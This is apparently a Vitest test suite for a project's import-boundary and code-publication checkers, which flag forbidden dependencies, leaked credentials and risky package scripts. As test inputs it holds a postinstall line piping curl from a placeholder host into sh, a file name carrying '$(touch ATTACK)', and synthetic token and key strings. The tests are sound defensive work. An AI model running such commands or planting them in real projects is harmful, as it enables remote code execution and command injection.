import { afterEach, describe, expect, it } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, existsSync, symlinkSync, linkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { checkBoundaries } from './check-boundaries.mjs';
import { checkPublication, inspectContent, inspectPath, inspectSupplyChain } from './check-publication.mjs';

const temporary: string[] = [];
function directory() {
  const root = mkdtempSync(path.join(tmpdir(), 'pactwoven-guards-'));
  temporary.push(root);
  return root;
}
function write(root: string, file: string, content: string) {
  const target = path.join(root, file);
  mkdirSync(path.dirname(target), { recursive: true });
  writeFileSync(target, content);
}
function workspace() {
  const root = directory();
  for (const [owner, name, dependencies] of [
    ['apps/web', 'web', { '@pactwoven/contracts': 'workspace:*' }],
    ['packages/contracts', 'contracts', { zod: '4.6.7' }],
    ['packages/domain', 'domain', { '@pactwoven/contracts': 'workspace:*', zod: '4.6.7' }],
    ['packages/db', 'db', { '@pactwoven/contracts': 'workspace:*', '@pactwoven/domain': 'workspace:*' }],
    ['services/signer', 'signer', { '@pactwoven/contracts': 'workspace:*' }],
  ] as const) {
    write(root, `${owner}/package.json`, JSON.stringify({ name: `@pactwoven/${name}`, dependencies, exports: { '.': './src/index.ts' } }));
    write(root, `${owner}/tsconfig.json`, JSON.stringify({ compilerOptions: { paths: { '@/*': ['./src/*'] } } }));
    write(root, `${owner}/src/index.ts`, 'export type RecordId = string;');
  }
  return root;
}
function git(root: string, args: string[]) {
  const result = spawnSync('git', args, { cwd: root, encoding: 'utf8', shell: false });
  if (result.status !== 0) throw new Error('Test Git fixture failed');
  return result.stdout;
}
function repository() {
  const root = directory();
  git(root, ['init', '-q']);
  return root;
}
function rules(root: string) { return checkBoundaries({ root }).findings.map((finding: { rule: string }) => finding.rule); }
afterEach(() => { temporary.splice(0).forEach((root) => rmSync(root, { recursive: true, force: true })); });

describe('dependency and import boundaries', () => {
  it('accepts only the two reviewed patch inputs and rejects executable additions', () => {
    const root = workspace();
    write(root, 'packages/security-patches/picomatch-4.0.7.patch', 'reviewed patch input');
    write(root, 'packages/security-patches/picomatch-LICENSE', 'upstream license');
    expect(rules(root)).toEqual([]);
    write(root, 'packages/security-patches/index.js', 'export const unexpected = true;');
    expect(rules(root)).toContain('dependency patch directory contains unreviewed files');
  });

  it('rejects a symlink in the patch input directory', () => {
    const root = workspace();
    write(root, 'packages/security-patches/picomatch-4.0.7.patch', 'reviewed patch input');
    symlinkSync('picomatch-4.0.7.patch', path.join(root, 'packages/security-patches/picomatch-LICENSE'));
    expect(rules(root)).toContain('dependency patch directory contains unreviewed files');
  });

  it('excludes generated OpenNext output while continuing to inspect web source', () => {
    const root = workspace();
    write(root, 'apps/web/.open-next/worker.js', 'import db from "@pactwoven/db";');
    expect(rules(root)).toEqual([]);
    write(root, 'apps/web/src/worker.ts', 'import db from "@pactwoven/db";');
    expect(rules(root)).toContain('forbidden dependency: apps/web -> packages/db');
  });

  it('accepts the reviewed graph including pure policy calls inside repositories', () => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', 'import type { RecordId } from "@pactwoven/contracts"; export type WebId = RecordId;');
    write(root, 'packages/db/src/index.ts', 'export * from "@pactwoven/domain";');
    expect(rules(root)).toEqual([]);
  });

  it.each([
    'import { execute } from "@pactwoven/db";',
    'export * from "@pactwoven/domain";',
    'export type { Wallet } from "@pactwoven/signer";',
    'const db = import("@pactwoven/" + "db");',
    'const db = import(`@pactwoven/db`);',
    'const db = require("../../../packages/db/src/index.ts");',
    'type Database = import("@pactwoven/db").Database;',
    'import db = require("@pactwoven/db");',
    'import "@pactwoven/\\u0064b";',
  ])('rejects forbidden imports including exports, types and loaders: %s', (source) => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', source);
    expect(rules(root).some((rule: string) => rule.startsWith('forbidden dependency'))).toBe(true);
  });

  it('resolves local aliases through a barrel and catches its forbidden re-export', () => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', 'export * from "@/barrel";');
    write(root, 'apps/web/src/barrel.ts', 'export * from "../../../packages/db/src/index.ts";');
    expect(rules(root)).toContain('forbidden dependency: apps/web -> packages/db');
  });

  it('checks inherited tsconfig paths, including conditional package import aliases', () => {
    const root = workspace();
    write(root, 'tsconfig.base.json', '{ /* JSONC */ "compilerOptions": { "paths": { "@private/*": ["./packages/db/src/*"], }, }, }');
    write(root, 'apps/web/tsconfig.json', '{ "extends": "../../tsconfig.base.json" }');
    write(root, 'apps/web/src/index.ts', 'import "@private/index"; import "#restricted";');
    write(root, 'apps/web/package.json', JSON.stringify({ name: '@pactwoven/web', imports: { '#restricted': { node: '@pactwoven/db', default: '@pactwoven/contracts' } } }));
    expect(rules(root).filter((rule: string) => rule === 'forbidden dependency: apps/web -> packages/db').length).toBeGreaterThanOrEqual(2);
  });

  it('rejects traversal outside the repo and symlinks across boundaries', () => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', 'import "../../../../outside.ts"; import "./hidden.ts";');
    symlinkSync(path.join(root, 'packages/db/src/index.ts'), path.join(root, 'apps/web/src/hidden.ts'));
    expect(rules(root)).toContain('import escapes repository root');
    expect(rules(root)).toContain('forbidden dependency: apps/web -> packages/db');
    expect(rules(root)).toContain('source symlink requires boundary review');
  });

  it('rejects computed loading and indirect loaders rather than certifying them', () => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', 'const load = require; import(modulePath); load(modulePath);');
    expect(rules(root)).toContain('computed module loading requires explicit boundary review');
    expect(rules(root)).toContain('indirect module loader requires boundary review');
  });

  it('blocks traversal in package subpaths and alternate executable module loaders', () => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', 'import "@pactwoven/contracts/../../db/src/index.ts"; import { createRequire } from "node:module"; globalThis["eval"](source);');
    expect(rules(root)).toContain('package subpath traversal requires boundary review');
    expect(rules(root)).toContain('custom runtime module loading requires boundary review');
    expect(rules(root)).toContain('runtime code generation requires boundary review');
  });

  it('permits only the reviewed filesystem-mock synchronization import in the exact offline fixture', () => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client' }));
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    write(root, 'programs/pactwoven/tests/execution/offline.test.ts', 'import { syncBuiltinESMExports } from "node:module"; syncBuiltinESMExports();');
    expect(rules(root)).toEqual([]);
  });

  it('allows an empty module marker without exporting the fixture capability', () => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client' }));
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    write(root, 'programs/pactwoven/tests/execution/offline.test.ts', 'import { syncBuiltinESMExports } from "node:module"; export {}; syncBuiltinESMExports();');
    expect(rules(root)).toEqual([]);
  });

  it.each([
    'import { createRequire as syncBuiltinESMExports } from "node:module";',
    'import { syncBuiltinESMExports, createRequire } from "node:module";',
    'import module from "node:module";',
    'import * as module from "node:module";',
    'export { syncBuiltinESMExports } from "node:module";',
    'const module = import("node:module");',
    'import { syncBuiltinESMExports } from "module";',
  ])('does not turn the offline synchronization exception into module access: %s', source => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client' }));
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    write(root, 'programs/pactwoven/tests/execution/offline.test.ts', source);
    expect(rules(root)).toContain('custom runtime module loading requires boundary review');
  });

  it.each(['programs/pactwoven/tests/other.test.ts', 'programs/pactwoven/client/src/index.ts', 'apps/web/src/sync.test.ts'])('keeps synchronization unavailable outside the exact fixture: %s', file => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client' }));
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    write(root, file, 'import { syncBuiltinESMExports } from "node:module";');
    expect(rules(root)).toContain('custom runtime module loading requires boundary review');
  });

  it('still inspects configured aliases underneath the exact synchronization import', () => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client' }));
    write(root, 'programs/pactwoven/tsconfig.json', JSON.stringify({ compilerOptions: { paths: { 'node:module': ['../../services/signer/src/index.ts'] } } }));
    write(root, 'programs/pactwoven/tests/execution/offline.test.ts', 'import { syncBuiltinESMExports } from "node:module";');
    expect(rules(root)).toContain('forbidden dependency: programs/pactwoven -> services/signer');
  });

  it.each([
    'export { syncBuiltinESMExports };',
    'export { syncBuiltinESMExports as sync };',
    'export default syncBuiltinESMExports;',
    'export const helpers = { sync: syncBuiltinESMExports };',
    'export function sync() { syncBuiltinESMExports(); }',
    'export = syncBuiltinESMExports;',
  ])('keeps the special fixture from exporting its capability: %s', source => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client' }));
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    write(root, 'programs/pactwoven/tests/execution/offline.test.ts', `import { syncBuiltinESMExports } from 'node:module'; ${source}`);
    expect(rules(root)).toContain('isolated builtin fixture cannot export bindings');
  });

  it.each([
    ['programs/pactwoven/client/src/index.ts', '../../tests/execution/offline.test.js'],
    ['programs/pactwoven/client/src/index.ts', '@/offline.test'],
    ['programs/pactwoven/client/src/index.ts', '#offline'],
    ['services/signer/src/index.ts', '../../../programs/pactwoven/tests/execution/offline.test.ts'],
    ['services/signer/src/index.ts', '@pactwoven/program-client/tests/execution/offline.test.ts'],
  ])('rejects importing the special fixture through %s %s', (file, specifier) => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client', imports: { '#offline': './tests/execution/offline.test.ts' } }));
    write(root, 'programs/pactwoven/tsconfig.json', JSON.stringify({ compilerOptions: { paths: { '@/*': ['./tests/execution/*'] } } }));
    write(root, 'programs/pactwoven/tests/execution/offline.test.ts', 'import { syncBuiltinESMExports } from "node:module"; syncBuiltinESMExports();');
    write(root, file, `import '${specifier}';`);
    expect(rules(root)).toContain('isolated builtin fixture cannot be imported');
  });

  it.each(['./tests/execution/offline.test.ts', './tests/execution/offline.test.js', './tests/*', './*'])('rejects package exports exposing the special fixture: %s', target => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client', exports: { '.': target } }));
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    write(root, 'programs/pactwoven/tests/execution/offline.test.ts', 'import { syncBuiltinESMExports } from "node:module"; syncBuiltinESMExports();');
    expect(rules(root).some(rule => rule.startsWith('isolated builtin fixture cannot be'))).toBe(true);
  });

  it('rejects a symlink import resolving to the isolated fixture', () => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client' }));
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    const fixture = 'programs/pactwoven/tests/execution/offline.test.ts';
    write(root, fixture, 'import { syncBuiltinESMExports } from "node:module"; syncBuiltinESMExports();');
    write(root, 'programs/pactwoven/client/src/index.ts', 'import "./alias.js";');
    symlinkSync(path.join(root, fixture), path.join(root, 'programs/pactwoven/client/src/alias.ts'));
    expect(rules(root)).toContain('isolated builtin fixture cannot be imported');
  });

  it.each(['exports', 'main', 'module', 'types', 'typings', 'browser'])('refuses encoded and remapped fixture exposure in %s', field => {
    const root = workspace();
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    write(root, 'programs/pactwoven/tests/execution/offline.test.ts', 'import { syncBuiltinESMExports } from "node:module"; syncBuiltinESMExports();');
    for (const target of ['./tests/execution/offline%2etest.ts', './tests/execution/offline.test.ts', './tests/execution/*.js', './tests/execution/*.mts',
      './tests/execution/offline.test.ts?cache', './tests/execution/offline.test.ts#cache', './tests/execution/*.ts?cache', './*es*s/execution/offline.test.ts', './tests/execution/OFFLINE.test.ts']) {
      write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client', [field]: field === 'exports' ? { '.': target } : target }));
      expect(rules(root).some(rule => rule === 'noncanonical package entry target' || rule.startsWith('isolated builtin fixture cannot be'))).toBe(true);
    }
  });

  it('identifies a hardlinked alias as the same isolated fixture', () => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client' }));
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    const fixture = 'programs/pactwoven/tests/execution/offline.test.ts';
    write(root, fixture, 'import { syncBuiltinESMExports } from "node:module"; syncBuiltinESMExports();');
    write(root, 'programs/pactwoven/client/src/index.ts', 'import "./alias.js";');
    linkSync(path.join(root, fixture), path.join(root, 'programs/pactwoven/client/src/alias.ts'));
    expect(rules(root)).toContain('isolated builtin fixture cannot be imported');
  });

  it.each(['./tests/execution/offline.test.ts?cache', './tests/execution/offline%2etest.ts'])('refuses noncanonical package-import targets: %s', target => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client', imports: { '#offline': target } }));
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    write(root, 'programs/pactwoven/tests/execution/offline.test.ts', 'import { syncBuiltinESMExports } from "node:module"; syncBuiltinESMExports();');
    write(root, 'programs/pactwoven/client/src/index.ts', 'import "#offline";');
    expect(rules(root)).toContain('noncanonical local module target');
  });

  it.each(['@pactwoven/program-client/tests/execution/offline%2etest.ts', '../../../programs/pactwoven/tests/execution/offline%2etest.ts'])('rejects encoded module resolution to the fixture: %s', specifier => {
    const root = workspace();
    write(root, 'programs/pactwoven/package.json', JSON.stringify({ name: '@pactwoven/program-client' }));
    write(root, 'programs/pactwoven/tsconfig.json', '{}');
    write(root, 'programs/pactwoven/tests/execution/offline.test.ts', 'import { syncBuiltinESMExports } from "node:module"; syncBuiltinESMExports();');
    write(root, 'services/signer/src/index.ts', `import '${specifier}';`);
    expect(rules(root)).toContain('noncanonical module path');
  });

  it('blocks privileged package aliases and declared but unused forbidden dependencies', () => {
    const root = workspace();
    write(root, 'apps/web/package.json', JSON.stringify({ name: '@pactwoven/web', dependencies: { '@pactwoven/db': 'workspace:*', innocuous: 'npm:pg@8.23.1' } }));
    write(root, 'apps/web/src/index.ts', 'import "innocuous";');
    expect(rules(root)).toContain('forbidden dependency: apps/web -> packages/db');
    expect(rules(root)).toContain('privileged dependency is unavailable to web: pg');
  });

  it.each([
    'import "openai";',
    'import "node:https";',
    'fetch("https://example.test");',
    'const request = globalThis["fetch"];',
    'const secret = process["env"];',
    'const ambient = process; const secret = ambient.env;',
    'const secret = import.meta.env;',
  ])('blocks provider, raw network and ambient credential access in domain: %s', (source) => {
    const root = workspace();
    write(root, 'packages/domain/src/index.ts', source);
    expect(rules(root).some((rule: string) => /deterministic module/.test(rule))).toBe(true);
  });

  it('fails on an unknown workspace, parser error, missing local file and escaping export', () => {
    const root = workspace();
    write(root, 'packages/unknown/src/index.ts', 'export const x = 1;');
    write(root, 'apps/web/src/broken.ts', 'import {');
    write(root, 'apps/web/src/index.ts', 'import "./missing";');
    write(root, 'packages/contracts/package.json', JSON.stringify({ name: '@pactwoven/contracts', exports: { '.': '../db/src/index.ts' } }));
    expect(rules(root)).toContain('workspace has no reviewed boundary policy');
    expect(rules(root)).toContain('source cannot be parsed for boundary inspection');
    expect(rules(root)).toContain('local import cannot be resolved for boundary inspection');
    expect(rules(root)).toContain('package export escapes its owning module');
  });

  it('permits only pinned root codec exports in the adapters workspace', () => {
    const root = workspace();
    write(root, 'packages/adapters/package.json', JSON.stringify({ name: '@pactwoven/adapters', dependencies: {
      '@solana/codecs-numbers': '8.6.0', '@solana/codecs-strings': '8.6.0', 'jsonc-parser': '3.3.1',
    } }));
    write(root, 'packages/adapters/src/index.ts', 'export * from "@solana/codecs-numbers"; export * from "@solana/codecs-strings"; export * from "jsonc-parser";');
    expect(rules(root)).toEqual([]);
    write(root, 'apps/web/src/index.ts', 'export * from "@pactwoven/adapters";');
    expect(rules(root)).toContain('forbidden dependency: apps/web -> packages/adapters');
  });

  it.each(['packages/domain', 'packages/contracts', 'packages/testkit'])('does not extend codec capability to %s', owner => {
    const root = workspace();
    write(root, `${owner}/package.json`, JSON.stringify({ name: '@pactwoven/' + owner.split('/')[1], dependencies: {
      '@solana/codecs-numbers': '8.6.0', '@solana/codecs-strings': '8.6.0', 'jsonc-parser': '3.3.1',
    } }));
    write(root, `${owner}/src/index.ts`, 'export * from "@solana/codecs-numbers";');
    expect(rules(root)).toContain('unreviewed effect or SDK dependency in deterministic module: @solana/codecs-numbers');
  });

  it.each([
    ['@solana/codecs-numbers', '8.5.0'],
    ['@solana/codecs-strings', '8.7.0'],
    ['jsonc-parser', '3.3.0'],
    ['@solana/kit', '8.6.0'],
    ['@solana-program/token', '0.18.0'],
    ['@solana/codecs-numbers/internal', '8.6.0'],
    ['jsonc-parser/lib/umd/main', '3.3.1'],
  ])('rejects unreviewed adapter dependency/export %s@%s', (specifier, version) => {
    const root = workspace();
    const name = specifier.startsWith('@') ? specifier.split('/').slice(0, 2).join('/') : specifier.split('/')[0]!;
    write(root, 'packages/adapters/package.json', JSON.stringify({ name: '@pactwoven/adapters', dependencies: { [name]: version } }));
    write(root, 'packages/adapters/src/index.ts', `export * from ${JSON.stringify(specifier)};`);
    expect(rules(root)).toContain(`unreviewed effect or SDK dependency in deterministic module: ${name}`);
  });

  it('keeps ambient network and credentials forbidden beside reviewed codecs', () => {
    const root = workspace();
    write(root, 'packages/adapters/package.json', JSON.stringify({ name: '@pactwoven/adapters', dependencies: { '@solana/codecs-numbers': '8.6.0' } }));
    write(root, 'packages/adapters/src/index.ts', 'import "@solana/codecs-numbers"; fetch("https://example.test"); const config = process.env;');
    expect(rules(root)).toContain('ambient network, credentials, or executable-code capability in deterministic module');
    expect(rules(root)).toContain('ambient credentials in deterministic module');
  });

  it.each(['dependencies', 'devDependencies', 'optionalDependencies', 'peerDependencies'])('rejects codec aliases in %s even beside a canonical approved pin', section => {
    for (const [name, approved, alternate] of [
      ['@solana/codecs-numbers', '8.6.0', '8.5.0'],
      ['@solana/codecs-strings', '8.6.0', '8.5.0'],
      ['jsonc-parser', '3.3.1', '3.3.0'],
    ]) {
      for (const version of [approved, alternate]) {
        const root = workspace();
        const manifest: Record<string, unknown> = { name: '@pactwoven/adapters', dependencies: { [name!]: approved } };
        manifest[section] = { ...(section === 'dependencies' ? manifest.dependencies as object : {}), alternate: `npm:${name}@${version}` };
        write(root, 'packages/adapters/package.json', JSON.stringify(manifest));
        write(root, 'packages/adapters/src/index.ts', 'export * from "alternate";');
        const result = checkBoundaries({ root });
        expect(result.findings).toContainEqual(expect.objectContaining({
          file: 'packages/adapters/src/index.ts',
          rule: 'reviewed codec dependencies require a direct package name and exact pin',
        }));
      }
    }
  });
});

describe('code-only publication', () => {
  it('admits only the reviewed dependency patch path', () => {
    expect(inspectPath('packages/security-patches/picomatch-4.0.7.patch')).toBeNull();
    expect(inspectPath('packages/security-patches/picomatch-LICENSE')).toBeNull();
    for (const file of ['packages/security-patches/other.patch', 'packages/security-patches/picomatch-4.0.8.patch',
      'apps/web/picomatch-4.0.7.patch', 'docs/picomatch-4.0.7.patch']) expect(inspectPath(file)).not.toBeNull();
  });
  it.each(['apps/web/wrangler.jsonc', 'apps/web/public/_headers'])('allows reviewed Cloudflare source configuration %s', file => {
    expect(inspectPath(file)).toBeNull();
  });
  it.each(['docs/spec.json', 'PRD.md', 'apps/web/README.MD', 'AGENTS.md', 'evidence/run.json', '.local/state.sql', '.env', '.env.example', 'apps/web/.env.production', 'infra/local.env.sample', 'env.sample.json', 'credentials/account.json', 'keys/signing-keypair.json', 'infra/id.json', 'private.pem', 'apps/web/secrets/key.ts', '../escape.ts', 'apps/../source.ts', 'apps/web\\file.ts', 'notes.txt', 'tests/output.pdf', 'node_modules/library/index.js', 'apps/web/.open-next/worker.js', 'apps/web/.open-next/assets/image.svg', 'apps/other/wrangler.jsonc', 'apps/other/public/_headers'])('rejects %s', (file) => {
    expect(inspectPath(file)).not.toBeNull();
  });

  it.each(['package.json', 'pnpm-lock.yaml', 'apps/web/src/page.tsx', 'packages/db/migrations/0001.sql', '.github/workflows/ci.yml', 'apps/web/src/fonts/manrope-LICENSE.txt', 'apps/web/src/fonts/geist-variable.ttf', 'apps/web/public/icons/key.svg', 'LICENSE', 'THIRD_PARTY_NOTICES.txt'])('allows reviewed implementation or legal notice %s', (file) => {
    expect(inspectPath(file)).toBeNull();
  });

  it('reports credential rule names without returning matched values', () => {
    const synthetic = ['gh' + 'p_' + 'A'.repeat(36), '-----BEGIN ' + 'PRIVATE KEY-----', 'sk_' + 'test_' + 'a'.repeat(28), 'post' + 'gres://account:dummy-credential@db.example.test/database', JSON.stringify(Array.from({ length: 64 }, (_, i) => i))];
    for (const value of synthetic) {
      const findings = inspectContent(value);
      expect(findings.length).toBeGreaterThan(0);
      expect(JSON.stringify(findings)).not.toContain(value);
    }
    expect(inspectContent('const token = process.env.PROVIDER_TOKEN;')).toEqual([]);
    expect(inspectContent(JSON.stringify(Array.from({ length: 32 }, (_, i) => i)))).toEqual([]);
  });

  it('inspects actual staged blobs even when the working copy is changed afterwards', () => {
    const root = repository();
    const synthetic = 'gh' + 'p_' + 'B'.repeat(36);
    write(root, 'apps/web/src/config.ts', `export const accidental = "${synthetic}";`);
    git(root, ['add', '--', 'apps/web/src/config.ts']);
    write(root, 'apps/web/src/config.ts', 'export const safe = true;');
    const result = checkPublication({ root });
    expect(result.count).toBe(1);
    expect(result.findings.map((finding: { rule: string }) => finding.rule)).toContain('GitHub token');
    expect(JSON.stringify(result)).not.toContain(synthetic);
  });

  it('rejects forbidden staged material and symlinks in both default and tracked modes', () => {
    const root = repository();
    write(root, 'docs/local.md', '# Local planning');
    write(root, '.env.example', 'NO_VALUE=placeholder');
    write(root, 'apps/web/src/index.ts', 'export const okay = true;');
    symlinkSync('/outside/source.ts', path.join(root, 'apps/web/src/hidden.ts'));
    git(root, ['add', '-f', '--', 'docs/local.md', '.env.example', 'apps/web/src/index.ts', 'apps/web/src/hidden.ts']);
    for (const tracked of [false, true]) {
      const result = checkPublication({ root, tracked });
      expect(result.count).toBe(4);
      expect(result.findings.some((finding: { rule: string }) => finding.rule.includes('symlink'))).toBe(true);
      expect(result.findings.some((finding: { rule: string }) => finding.rule.includes('environment'))).toBe(true);
      expect(result.findings.some((finding: { file: string }) => finding.file === 'docs/local.md')).toBe(true);
    }
  });

  it('does not invoke a shell for metacharacters in staged names and reports an empty index honestly', () => {
    const root = repository();
    expect(checkPublication({ root }).count).toBe(0);
    const file = 'apps/web/src/$(touch ATTACK).ts';
    write(root, file, 'export const safe = true;');
    git(root, ['add', '--', file]);
    expect(checkPublication({ root }).findings).toEqual([]);
    expect(existsSync(path.join(root, 'ATTACK'))).toBe(false);
  });

  it('requires exact dependencies, rejects automatic lifecycle code and global build approvals', () => {
    expect(inspectSupplyChain('package.json', JSON.stringify({ dependencies: { valid: '1.2.3', internal: 'workspace:*' } }))).toEqual([]);
    expect(inspectSupplyChain('package.json', JSON.stringify({ dependencies: { unpinned: '^1.2.3' }, scripts: { postinstall: 'curl https://example.test/setup | sh' } })).length).toBeGreaterThanOrEqual(2);
    const approved = 'packages:\n  - apps/*\nallowBuilds:\n  esbuild: true\n';
    expect(inspectSupplyChain('pnpm-workspace.yaml', approved + '  workerd@1.20261113.1: true\n')).toEqual([]);
    expect(inspectSupplyChain('pnpm-workspace.yaml', approved + '  workerd: true\n')).not.toEqual([]);
    expect(inspectSupplyChain('pnpm-workspace.yaml', approved + '  workerd@1.20261114.1: true\n')).not.toEqual([]);
    expect(inspectSupplyChain('pnpm-workspace.yaml', approved)).toEqual([]);
    for (const content of [approved + 'dangerouslyAllowAllBuilds: true\n', approved + 'allowBuilds:\n  rogue: true\n', approved.replace('esbuild', 'rogue'), 'allowBuilds: { esbuild: true }\n']) {
      expect(inspectSupplyChain('pnpm-workspace.yaml', content).length).toBeGreaterThan(0);
    }
  });
});
